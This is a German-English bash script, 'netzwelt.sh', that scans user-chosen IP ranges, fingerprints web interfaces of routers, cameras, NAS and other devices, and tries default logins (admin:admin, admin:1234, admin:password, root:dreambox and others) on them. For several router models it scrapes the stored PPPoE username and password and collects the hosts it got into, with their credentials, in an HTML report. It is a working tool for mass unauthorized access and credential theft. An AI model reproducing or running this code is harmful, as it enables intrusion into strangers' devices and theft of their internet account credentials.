#!/bin/bash -
#  netzwelt.sh
#  Copyright (c) 2014 by Alexander Thiele
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA#
#
clear
echo "
        \|||/
        (o o)
,~~~ooO~~(_)~~~~~~~~~~~~~~~,
| little webscanner        |
| by Axelskywalker         |
| github.com/axelskywalker |
|                          |
'~~~~~~~~~~~~~~ooO~~~~~~~~~'
       |__|__|
        || ||
       ooO Ooo
"
##################defaults#################
port=80    #for pscan
ip=$2
von=$3
bis=$4
version=1
host=1
DATUM=$(date +"%d_%m_%Y")
install()
{
 if [ ! -n "`which lynx`" ];then echo "lynx not found,please install"    #lynx installed?
  exit
 fi
}

usage()
{
echo "
 $0 [option]
 $0 -ip                                                  -> show my ip
 $0 -s  [b-block] [c-block-von] [c-block-bis ]           -> scanning



Example:$0 -s 212.95 10 20         scanning 212.95.10.1 - 212.95.20.255
"
}


onip()
{
      printf  "Your ip is... "
      echo "$(lynx -source http://checkip.dyndns.org | awk -F: '{print $2}' | awk -F\< '{print $1}')"
      exit
}


delout()
{
 rm -fr output
}
netgear()
{
   printf " Login:$(lynx -source -auth=admin:password $1/setup.cgi?next_file=pppoe.htm | grep input | grep pppoeName | awk -F\" '{print $12}') Passwort:$(lynx -source -auth=admin:password $1/setup.cgi?next_file=pppoe.htm | grep input | grep pppoePasswd | awk -F\" '{print $12}')\n"
}


devolo()
{
u=$(lynx -source -auth=admin:password $1/doc/de/wan_adv.htm | grep "simple_ppp_username" | awk -F\" '{print $2}')
p=$(lynx -source -auth=admin:password $1/doc/de/wan_adv.htm | grep "simple_ppp_pwd" | awk -F\" '{print $2}')
   printf " Login:$u Passwort:$p\n"


}

intellinetadmin()
{
   u=$(lynx -source -auth=admin:admin $1/basic/home_wan.htm | grep "\"wan_PPPUsername" | awk -F\" '{print $10}')
   p=$(lynx -source -auth=admin:admin $1/basic/home_wan.htm | grep "\"wan_PPPPassword" | awk -F\" '{print $10}')
   printf " Login:$u Passwort:$p\n"
}

intellinet1234()
{
   u=$(lynx -source -auth=admin:1234 $1/basic/home_wan.htm | grep "\"wan_PPPUsername" | awk -F\" '{print $10}')
   p=$(lynx -source -auth=admin:1234 $1/basic/home_wan.htm | grep "\"wan_PPPPassword" | awk -F\" '{print $10}')
   printf " Login:$n Passwort:$p\n"
}
acer()
{

   u=$(lynx -source $1/tcpipwan.asp | grep "name=\"pppUserName" | awk -F\" '{print $12}')
   p=$(lynx -source $1/tcpipwan.asp | grep "name=\"pppPassword" | awk -F\" '{print $12}')
   printf " Login:$u Passwort:$p\n"
}





scan()
{
echo "scanning..."
if [ "$1" != "-f" ];then
 if ! test -e pscan      #pscan exist?
  then
     echo "pscan not found, please download from github.com/axelskywalker"
  exit
 fi

if [ "$bis" -lt "$von" ]
 then
     echo "falsche Angabe, die zweite Zahl muss kleiner sein wie die dritte"
     exit
fi
   for i in  `seq $von $bis`
    do
      ./pscan $ip $port $i  >>datav
      echo " -> found [ $(cat datav | grep -v Scan | grep "." | sort | uniq | wc -l | awk '{print $1}') ] in $ip.$i..."
      cat datav >> data
      echo "" >datav

    done
fi
echo ""

rechner="$(cat data | grep -v Scan | grep "." | sort | uniq | wc -l | awk '{print $1}')"

if [ "$rechner" = "0" ];then echo "Sorry, " ;exit;fi
echo "$rechner Rechner gefunden...->durchsuchung starten"
cat data | grep -v Scan | sort | uniq | while read line
 do
lock=""
   if [ "$line" != "" ];then
       echo "$line" >>ipsgescannt
       wget $line  -o cache -O output --timeout=3 --tries=1
       if [ "$(grep "Test" output)" !=  "" ];then echo "$line ->  Test Page ";delout;info="Test Page";lock=1;html
       elif [ "$(grep "LANCOM" output)" !=  "" ];then echo "$line -> Lancom Router ";delout;lock=1;info="Lancom Router";html
       elif [ "$(grep "SonicWALL" output)" !=  "" ];then echo "$line -> SonicWALL ";delout;lock=1;info="SonicWALL";html
       elif [ "$(grep "Neige-Netzwerkkamera" output)" !=  "" ];then echo "$line -> Schwenk-Neige-Netzwerkkamera ";delout;lock=1;info="Schwenk-Neige-Netzwerkkamera";html
       elif [ "$(grep "LanMpegView0.htm" output)" !=  "" ];then echo "$line -> Cam Guard";delout;lock=1;info="Cam Guard";html
       elif [ "$(grep "aspx?gotodefault=true" output)" !=  "" ];then echo "$line -> Windows Home Server?";delout;lock=1;info="Windows Home Server?";html
       elif [ "$(grep "rpAuth.html" output)" !=  "" ];then echo "$line -> Zyxel ";delout;lock=1;info="Zyxel ";html
       elif [ "$(grep "scriptaculous.js?load=effects" output)" !=  "" ];then echo "$line -> AAF E2 Webcontrol ->D-Box";delout;lock=1;info="AAF E2 Webcontrol->D-Box";html
       elif [ "$(grep "Bootloader-NET" output)" !=  "" ];then echo "$line -> Anlage mit Bootloader-NET";delout;lock=1;info="Anlage mit Bootloader-NET";html
       elif [ "$(grep "www.ta.co.at" output)" !=  "" ];then echo "$line -> Anlage mit Bootloader-NET";delout;lock=1;info="Anlage mit Bootloader-NET";html
       elif [ "$(grep "belkin" output)" !=  "" ];then echo "$line -> Belkin Router ";delout;lock=1;info="Belkin Router";html
       elif [ "$(grep "RomPager" output)" !=  "" ];then echo "$line -> RomPager Server ";delout;lock=1;info="RomPager Server";html
       elif [ "$(grep "mobotix" output)" !=  "" ];then echo "$line -> Mobotix Webcam -";delout;lock=1;info="Mobotix Webcam";html
       elif [ "$(grep "Netzwerkkonfigurations-Assistent" output)" !=  "" ];then echo "$line -> Windows Small Buisness Server";delout;lock=1;info="Windows Small Buisness Server";html
       elif [ "$(grep "TechniSat" output)" !=  "" ];then echo "$line -> TechniSat Webserver(Receiver?)";delout;lock=1;info="Technisat Webserver (Receiver?)";html
       elif [ "$(grep "pressum" output)" !=  "" ];then echo "$line -> Normale Homepage ";delout;lock=1;info="Normale Homepage";html
       elif [ "$(grep "rcube_webmail" output)" !=  "" ];then echo "$line -> Round Cube Webmail ";delout;lock=1;info="Round Cube Mail";html
       elif [ "$(grep "Vertriebsportal" output)" !=  "" ];then echo "$line -> SAG Vertriebsportal";delout;lock=1;info="SAG Vertriebsportal";html
       elif [ "$(grep "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678" output)" !=  "" ];then echo "$line -> Pragma Standard Login";delout;lock=1;info="Pragma Standard Login";html
       elif [ "$(grep "QNAP" output)" !=  "" ];then echo "$line -> QNAP Web Server Settings ";delout;lock=1;info="QNAP Web Server";html
       elif [ "$(grep "Detachering" output)" !=  "" ];then echo "$line -> Alko Detachering Webmail - Login";delout;lock=1;info="Alko Detachering Webmail";html
       elif [ "$(grep "mailscope" output)" !=  "" ];then echo "$line -> mailscope";delout;lock=1;info="mailscope";html
       elif [ "$(grep "FileVault" output)" !=  "" ];then echo "$line -> iomega FileVault";delout;lock=1;info="iomega FileVault";html
       elif [ "$(grep "Redirecting to <a href=\"/cgi-bin/home" output)" !=  "" ];then echo "$line -> TV Box Webinterface ";delout;lock=1;info="TV Box Webinterface";html
       elif [ "$(grep "TeamViewer" output)" !=  "" ];then echo "$line -> Running Teamviewer";delout;lock=1;info="Running Teamviewer";html
       elif [ "$(grep "splashDefault-l-logo.jpg" output)" !=  "" ];then echo "$line -> Blue Quartz Placeholder";delout;lock=1;info="Blue Quartz Placeholder";html
       elif [ "$(grep "status.asp" output)" !=  "" ];then echo "$line -> Acer Router";acer $line;delout;lock=1;info="Acer Router";html
       elif [ "$(grep "IP300PTR" output)" !=  "" ];then echo "$line -> IP Camera";delout;lock=1;info="IP Camera";html
       elif [ "$(grep "Hewlett-Packard Development" output)" !=  "" ];then echo "$line -> Hewlett-Packard Development";delout;lock=1;info="Hewlett-Packard";html
       elif [ "$(grep "Willkommen" output | grep "Welcome")" !=  "" ];then echo "$line -> Welcome Page";delout;lock=1;info="Welcome Page";html
       elif [ "$(grep "Tobit" output)" !=  "" ];then echo "$line -> Welcome Page";delout;lock=1;info="Welcome Page";html
       elif [ "$(grep "Konfigurationsprogramm starten" output)" !=  "" ];then echo "$line -> Telekom Router Speedport";delout;lock=1;info="Telekom Router";html
       elif [ "$(grep "WG-602" output)" !=  "" ];then echo "$line -> Handlink WG-602";delout;lock=1;info="Handlink WG-602";html
       elif [ "$(grep "XAMPP" output)" !=  "" ];then echo "$line -> XAMPP";delout;lock=1;info="XAMMP";html
       elif [ "$(grep "eMule" output)" !=  "" ];then echo "$line -> eMule Webinterface";delout;lock=1;info="eMule Webinterface";html
       elif [ "$(grep "server-ams" output)" !=  "" ];then echo "$line -> server-ams";delout;lock=1;info="server-ams";html
       elif [ "$(grep "SolarLog" output)" !=  "" ];then echo "$line -> SolarLog";delout;lock=1;info="Solar-Log";html
       elif [ "$(grep "Internetinformationsdienste" output)" !=  "" ];then echo "$line -> Leere Seite";delout;lock=1;info="Leere Seite";html
       elif [ "$(grep "Placeholder" output)" !=  "" ];then echo "$line -> Placeholder Page";delout;lock=1;info="Placeholder Page";html
       elif [ "$(grep "window.location=\"cgi-bin/webmng.cgi?next_file=login.htm" output)" !=  "" ];then echo "$line -> Peer TV Web -Management";delout;lock=1;info="Peer TV Web";html
       elif [ "$(grep "Enigma" output)" !=  "" ];then echo "$line -> Enigma Webinterface (DBOX)";delout;lock=1;info="Enigma Webinterface";html
       elif [ "$(grep "yWeb" output)" !=  "" ];then echo "$line -> yWeb (DBOX)";delout;lock=1;info="yWeb->DBOX";html
       elif [ "$(grep "IServ" output)" !=  "" ];then echo "$line -> IServ Weboberflaeche";delout;lock=1;info="IServ";html
       elif [ "$(grep "BMR" output)" !=  "" ];then echo "$line -> BMR Webserver";delout;lock=1;info="BMR Webserver";html
       elif [ "$(grep "MSNTV" output)" !=  "" ];then echo "$line -> MSNTV";delout;lock=1;info="MSNTV";html
       elif [ "$(grep "Bosch" output)" !=  "" ];then echo "$line -> Bosch 1ch DVR?";delout;lock=1;info="Bosch 1ch BVR?";html
       elif [ "$(grep "IIS7" output)" !=  "" ];then echo "$line -> IIS7 Internet Information Service";delout;lock=1;info="IIS7 Internet Information Service";html
       elif [ "$(grep "WRT54G" output)" !=  "" ];then echo "$line -> Linksys WRT54G";delout;lock=1;info="Linksys WRT54G";html
       elif [ "$(grep "Linksys_Blue.gif" output)" !=  "" ];then echo "$line -> Linksys Storage System";delout;lock=1;info="Linksys Storage System";html
       elif [ "$(grep "Connectivity" output)" !=  "" ];then echo "$line -> Connectivity Server";delout;lock=1;info="Connectivity Server";html
       elif [ "$(grep "WL700gE" output)" !=  "" ];then echo "$line -> WL700gE Configuration";delout;lock=1;info="WL700gE Configurstion";html
       elif [ "$(grep "dmicros.com" output)" !=  "" ];then echo "$line -> Dedicated Micros EcoSense";delout;lock=1;info="Dedicated Micros EcoSense";html
       elif [ "$(grep "LaserJet" output)" !=  "" ];then echo "$line -> HP Laserjet Drucker";delout;lock=1;info="HP Laserjet Drucker";html
       elif [ "$(grep "Index of" output)" !=  "" ];then echo "$line -> Index of (event. Dateien gefunden)";delout;lock=1;info="Index of(event. Dateien gefunden=";html
       elif [ "$(grep "Grandstream" output)" !=  "" ];then echo "$line -> Grandstream Device Configuration";delout;lock=1;info="Grandstream Device Configuration";html
       elif [ "$(grep "Prestige" output)" !=  "" ];then echo "$line -> Prestige Login";delout;lock=1;info="Prestige Login";html
       elif [ "$(grep "ZyXEL" output)" !=  "" ];then echo "$line -> ZyXEL ZyWALL Series";delout;lock=1;info="ZyXEL ZyWALL Series";html
       elif [ "$(grep "Teledat" output)" !=  "" ];then echo "$line -> Teledat Router";delout;lock=1;info="Teledat Router";html
       elif [ "$(grep "Dreambox" output)" !=  "" ];then echo "$line -> Dreambox Webcontrol";delout;lock=1;info="Dreambox Webcontrol";html
       elif [ "$(grep "works!" output)" !=  "" ];then echo "$line -> Apache IT works Seite";delout;lock=1;info="Apache IT works Seite";html
       elif [ "$(grep "Joomla" output)" !=  "" ];then echo "$line -> Joomla Seite";delout;lock=1;info="Joomla Seite";html
       elif [ "$(grep "www.a-link.com" output)" !=  "" ];then echo "$line -> A-Link Login Screen";delout;lock=1;info="A-Link Login Screen";html
       elif [ "$(grep "Construction" output)" !=  "" ];then echo "$line -> Under Construction";delout;lock=1;info="Under Construction";html
       elif [ "$(grep "GIPZ" output)" !=  "" ];then echo "$line -> GIPZ Network System";delout;lock=1;info="GIPZ Network System";html
       elif [ "$(grep "http-equiv=\"refresh\"" output)" !=  "" ];then echo "$line -> Weiterleitung (vielleicht interessant)";delout;lock=1;info="Weiterleitung";html
       elif [ "$(grep "IBM HTTP Server" output)" !=  "" ];then echo "$line -> IBM HTTP Server";delout;lock=1;info="IBM HTTP Server";html
       elif [ "$(grep "Sunny WebBox" output)" !=  "" ];then echo "$line -> Sunny WebBox, Standard PW->sma";delout;lock=1;info="Sunny WebBox,Standard PW->sma";html
       elif [ "$(grep "Funkwerk" output)" !=  "" ];then echo "$line -> Funkwerk Gateway";delout;lock=1;info="Funkwerk Gateway";html
       elif [ "$(grep "nst4TWN.exe" output)" !=  "" ];then echo "$line -> DVR Viewer";delout;lock=1;info="DVR Viewer";html
       elif [ "$(grep "MattiSyno4x500" output)" !=  "" ];then echo "$line -> Synology Cube Station - MattiSyno4x500";delout;lock=1;info="Synology Cube Station - MattiSyno4x500";html
       elif [ "$(grep "tcpip.ssi" output)" !=  "" ];then echo "$line ->  RAINOTRONIK    ";delout;lock=1;info="RAINOTRONIK";html
       elif [ "$(grep "phpinfo" output)" !=  "" ];then echo "$line ->  phpinfo()    ";delout;lock=1;info="phpinfo()";html
       else
       lock=""
delout
       fi

if [ "$lock" != "1" ];then
 wget $line --http-user=admin --http-password=test -o cache -O output --tries=2 --timeout=2
 if [ "$(cat output)" != "" ];then echo "$line -> Konnte nicht erkannt werden ";fire $line;lock=1;info="Konnte nicht erkannt werden";html;fi
 delout
fi


if [ "$lock" != "1" ];then
 wget $line --http-user=admin --http-password=admin -o cache -O output --tries=2 --timeout=2
 if [ "$(cat output)" != "" ];then echo "$line -> User:admin PW:admin ";echo $line >>open;lock=1;html;fi
 if [ "$(cat output | grep "status_deviceinfo.htm")" != "" ];then printf " Intellinet Router";intellinetadmin $line;lock=1;u=admin;p=admin;html;fi
 if [ "$(cat output | grep "Microlink")" != "" ];then printf " Microlink ADSL Router";devolo $line;delout;lock=1;u=admin;p=amdin;html;fi
 if [ "$(cat output | grep "Siemens")" != "" ];then echo " $line -> Siemens ADSL Router";delout;lock=1;u=admin;p=admin;html;fi
 delout
fi


if [ "$lock" != "1" ];then
  wget $line --http-user=admin --http-password=1234 -o cache -O output --tries=2 --timeout=2
   if [ "$(cat output)" != "" ];then echo "$line -> User:admin PW:1234 ";echo $line >>open;lock=1;u=admin;p=1234;html;fi
   if [ "$(cat output | grep "status_deviceinfo.htm")" != "" ];then printf " Intellinet Router";intellinet1234 $line;lock=1;u=admin;p=1234;html;fi
   if [ "$(cat output | grep "Microlink")" != "" ];then echo " Microlink ADSL Router";devolo $line;delout;lock=1;u=admin;p=1234;html;fi
  delout
fi


if [ "$lock" != "1" ];then
wget $line --http-user=admin --http-password=12345 -o cache -O output --tries=2 --timeout=2
if [ "$(cat output)" != "" ];then echo "$line -> User:admin PW:12345 ";echo $line >>open;lock=1;u=admin;p=12345;html;fi
if [ "$(cat output | grep "status_deviceinfo.htm")" != "" ];then printf " Intellinet Router";intellinet1234 $line;lock=1;u=admin;p=12345;html;fi
if [ "$(cat output | grep "Microlink")" != "" ];then printf " Microlink ADSL Router";devolo $line;delout;lock=1;u=admin;p=12345;html;fi
delout
fi


if [ "$lock" != "1" ];then
   wget $line --http-user=admin --http-password=123456 -o cache -O output --tries=2 --timeout=2
   if [ "$(cat output)" != "" ];then echo "$line -> User:admin PW:123456 ";echo $line >>open;lock=1;u=admin;p=123456;html;fi
   if [ "$(cat output | grep "status_deviceinfo.htm")" != "" ];then printf " Intellinet Router";intellinet $line;lock=1;u=admin;p=123456;html;fi
   if [ "$(cat output | grep "Microlink")" != "" ];then printf " Microlink ADSL Router";devolo $line;delout;lock=1;u=admin;p=123456;html;fi
   delout
fi


if [ "$lock" != "1" ];then
   wget $line --http-user=admin --http-password=password -o cache -O output --tries=2 --timeout=2
   if [ "$(cat output)" != "" ];then printf "$line -> User:admin PW:password ";echo $line >>open;lock=1;u=admin;p=password;html;fi
   if [ "$(cat output | grep "setup.cgi?next_file")" != "" ];then printf " Netgear Router";netgear $line;lock=1;u=admin;p=password;html;fi
   delout
fi


if [ "$lock" != "1" ];then
   wget $line --http-user=root --http-password=dreambox -o cache -O output --tries=2 --timeout=2
   if [ "$(cat output)" != "" ];then echo "$line -> User:root PW:dreambox";echo  $line >>open;lock=1;u=root;p=dreambox;html;fi
  delout
fi


if [ "$lock" != "1" ];then
   wget $line --http-user=root -o cache -O output --tries=2 --timeout=2
   if [ "$(cat output)" != "" ];then echo "$line ->  User:root ";echo $line >>open;lock=1;u=root;p=none;html;fi
   delout
fi



   fi
 done
if [ "$html" = "" ];then html=$(grep html LOCK | awk -F= '{print $2}');fi
if [ "$html" = "1" ];then firefox all.html ;fi
exit



}







html()#create html file
{
if [ "$html" = "" ];then html=$(grep html LOCK | awk -F= '{print $2}');fi
if [ "$html" = "1" ];then
echo "<a href=\"http://$line\" target=\"_blank\">$line</a>  Info:$info<br>" >>all.html
if [ "$u" != "" ];then echo "USER:$u" >>all.html;fi
if [ "$p" != "" ];then echo "PASSWORT:$p" >>all.html;fi
echo "<hr>" >>all.html
fi
u=""
p=""
}
if [ "$1" = "" ];then usage;exit;fi	
if [ "$1" = "-ip" ];then onip;exit;fi	
if [ "$1" = "-s" ];then 
  if [ "$3" = "" ];then ;usage;exit;fi
 scan
 exit
fi	
